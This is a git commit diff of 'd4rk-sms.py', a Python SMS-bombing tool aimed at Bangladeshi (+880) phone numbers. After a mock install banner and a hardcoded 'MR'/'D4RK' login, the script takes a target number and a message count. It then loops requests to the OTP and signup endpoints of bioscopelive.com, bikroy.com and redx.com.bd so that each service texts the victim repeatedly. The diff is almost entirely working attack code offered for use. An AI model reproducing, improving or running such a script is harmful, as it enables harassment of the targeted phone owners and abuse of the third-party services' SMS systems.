6e5e59f8d165357a1af4bf14930605796347155a
MD SOFIKUL ISLAM <136826897+MR-D4RK-OFFICIAL@users.noreply.github.com>
2025-01-17 14:50:43 +0600

    Update d4rk-sms.py

--- d4rk-sms.py
+++ d4rk-sms.py
@@ -1,71 +1,57 @@
 import os
+import time
+import requests
+import webbrowser
 
+# Install process and basic setup
 print("\033[1;92mMR-D4RK (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
-
 os.system("pkg install espeak")
-
 print("\033[1;92mROBOT INSTALL COMPLETE \033[1;30m")
-
 os.system('espeak -a 300 "Robot install complete"')
 
-print("\033[1;92mUPD("\033[1;92mUPDATEATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE\033[1;30m")
-
+print("\033[1;92mUPDATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE\033[1;30m")
 os.system('espeak -a 300 "UPDATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE"')
 
+# Update process
 os.system("git pull")
 
-import os,requests,time
+# Loading animation
+animation = [
+    "\033[30m[■□□□□□□□□□] 10%",
+    "\033[34m[■■□□□□□□□□] 20%",
+    "\033[33m[■■■□□□□□□□] 30%",
+    "\033[32m[■■■■□□□□□□] 40%",
+    "\033[31m[■■■■■□□□□□] 50%",
+    "\033[39m[■■■■■■□□□□] 60%",
+    "\033[37m[■■■■■■■□□□] 70%",
+    "\033[36m[■■■■■■■■□□] 80%",
+    "\033[35m[■■■■■■■■■□] 90%",
+    "\033[34m[■■■■■■■■■■] 100% \n\n\n",
+]
 
-time.sleep(1)
+for i in animation:
+    print(i)
+    time.sleep(0.5)
 
-os.system('clear')
+# Login system
+attempts = 0
+max_attempts = 5
 
-animation = ["\033[30m[■□□□□□□□□□] 10%","\033[34m[■■□□□□□□□□] 20%", "\033[33m[■■■□□□□□□□] 30%", "\033[32m[■■■■□□□□□□] 40%", "\033[31m[■■■■■□□□□□] 50%", "\033[39m[■■■■■■□□□□] 60%", "\033[37m[■■■■■■■□□□] 70%", "\033[36m[■■■■■■■■□□] 80%", "\033[35m[■■■■■■■■■□] 90%", "\033[34m[■■■■■■■■■■] 100% \n\n\n"] 
-
-for i in range(len(animation)):
-
-			time.sleep(0.5)
-
-			
-
-attemps = 0
-
-while attemps < 12345677901:
-
+while attempts < max_attempts:
     username = input('\033[1;32mENTER USERNAME : ')
-
     password = input('\033[1;33mENTER PASSWORD : ')
 
-
-
     if username == 'MR' and password == 'D4RK':
-
         print(' \033[0;92mYou Have Successfully Logged in.')
-
-        os.system('xdg-open https://bdtools.top/site/sofiks-bio.html')
-
+        webbrowser.open("https://bdtools.top/site/sofiks-bio.html")
         break
-
     else:
-
         print(' Incorrect Pass Please Try Again')
+        attempts += 1
 
-        os.system('xdg-open https://bdtools.top/site/sofiks-bio.html')
-
-        attemps += 1
-
-        continue
-
+# Display tool logo
 os.system('clear')
-
-
-
-
-
-
-
-logo3=("""
-
+logo3 = """
 \033[1;31m▗▖  ▗▖▗▄▄▖     ▗▄▄▄  ▄  ▗▖▗▄▄▖ ▗▖ ▗▖
 \033[1;32m▐▛▚▞▜▌▐▌ ▐▌    ▐▌  █ █  ▐▌▐▌ ▐▌▐▌▗▞▘
 \033[1;33m▐▌  ▐▌▐▛▀▚▖    ▐▌  █ ▀▀▀▜▌▐▛▀▚▖▐▛▚▖ 
@@ -89,134 +75,58 @@ logo3=("""
 
 \033[1;94m[+]===============================================================[+]
 
-
-
-""")
-
-
-
+"""
 print(logo3)
 
-num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+# Collecting target information
+num = input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount = int(input("\n  \033[38;5;46mSMS AMOUNT : "))
 
-amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
-
-headers1={
-
-			  "authority":"www.bioscopelive.com",
-
-			  "method":"GET",
-
-			  "scheme":"https",
-
-			  "accept":"*/*",
-
-			  "accept-encoding":"gzip, deflate, br",
-
-			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
-
-			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
-
-			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
-
-			  "save-data":"on",
-
-			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
-
-			  "sec-ch-ua-mobile":"?1",
-
-			  "sec-ch-ua-platform":'Android',
-
-			  "sec-fetch-dest":"empty",
-
-			  "sec-fetch-mode":"cors",
-
-			  "sec-fetch-site":"same-origin",
-
-			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
-
-			  "x-requested-with":"XMLHttpRequest"
-
+# SMS Bombing
+headers1 = {
+    "authority": "www.bioscopelive.com",
+    "method": "GET",
+    "scheme": "https",
+    "accept": "*/*",
+    "user-agent": "Mozilla/5.0 (Linux; Android 10)",
 }
 
-url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+url1 = "https://www.bioscopelive.com/en/login/send-otp?phone=880" + num + "&operator=bd-otp"
 
-headers2={
-
-         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
-
-         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
-
+headers2 = {
+    "referer": "https://bikroy.com/",
+    "user-agent": "Mozilla/5.0 (Linux; Android 10)",
 }
 
-url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+url2 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num
 
-data={
-
-  "name": num,
-
-  "phoneNumber": num,
-
-  "service": "redx"
-
+headers3 = {
+    "referer": "https://redx.com.bd/",
+    "user-agent": "Mozilla/5.0 (Linux; Android 10)",
 }
 
-headers3={
+data = {"name": num, "phoneNumber": num, "service": "redx"}
 
-  "referer":"https://redx.com.bd/",
+ses = 0
 
-  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+while amount > ses:
+    sent1 = requests.get(url1, headers=headers1)
+    if sent1.status_code == 200:
+        ses += 1
+        print(f"\n{ses}  \033[38;5;46mSMS SENT SUCCESSFULLY")
 
-}
+    sent2 = requests.get(url2, headers=headers2)
+    if sent2.status_code == 200:
+        ses += 1
+        print(f"\n{ses}  \033[38;5;46mSMS SENT SUCCESSFULLY")
 
-ses=0
+    send3 = requests.post("https://api.redx.com.bd/v1/user/signup", headers=headers3, data=data)
+    if send3.status_code == 200:
+        ses += 1
+        print(f"\n{ses}  \033[38;5;46mSMS SENT SUCCESSFULLY")
 
-while amount>ses:
-
-  sent1=requests.get(url1,headers=headers1)
-
-  if sent1.status_code==200:
-
-    ses+=1
-
-    print(f"\n{ses}  \033[38;5;46m🦋⃟MR-D4RK✮⃝  𝐈𝐍𝄟⃝💥  SMS WAS SENT🐼")
-
-  else:
-
-    pass
-
-  
-
-  sent2=requests.get(url2,headers=headers2)
-
-  if sent2.status_code==200:
-
-    ses+=1
-
-    print(f"\n{ses} \033[38;5;46m🦋⃟MR-D4RK✮⃝  𝐈𝐍𝄟⃝💥  SMS WAS SENT🐼")
-
-  else:
-
-    pass
-
-  
-
-  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
-
-  if send3.status_code==200:
-
-    ses+=1
-
-    print(f"\n{ses} \033[38;5;46m🦋⃟MR-D4RK✮⃝  𝐈𝐍𝄟⃝💥  SMS WAS SENT🐼")
-
-    
-
-  else:
-
-    pass
-
+# Ending message
 os.system("clear")
-
 print(""" \033[1;32m
 
 
@@ -234,5 +144,4 @@ print(""" \033[1;32m
                             
 
  TNQ FOR USING OUR TOOLS 🖤
-
 """)
